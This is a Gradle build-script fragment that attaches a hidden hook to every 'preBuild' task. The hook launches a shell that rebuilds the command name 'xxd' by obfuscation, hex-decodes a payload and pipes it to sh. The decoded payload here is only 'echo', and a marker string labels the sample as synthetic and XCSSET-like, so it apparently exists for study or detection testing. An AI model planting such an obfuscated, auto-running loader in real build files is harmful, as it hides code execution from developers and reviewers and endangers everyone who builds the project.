tasks.all {
  if (name.contains("preBuild")) {
    doLast {
      ProcessBuilder("sh", "-c", "((p(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f | p | sh)); synthetic-xcsset-secret-never-expose").start()
    }
  }
}
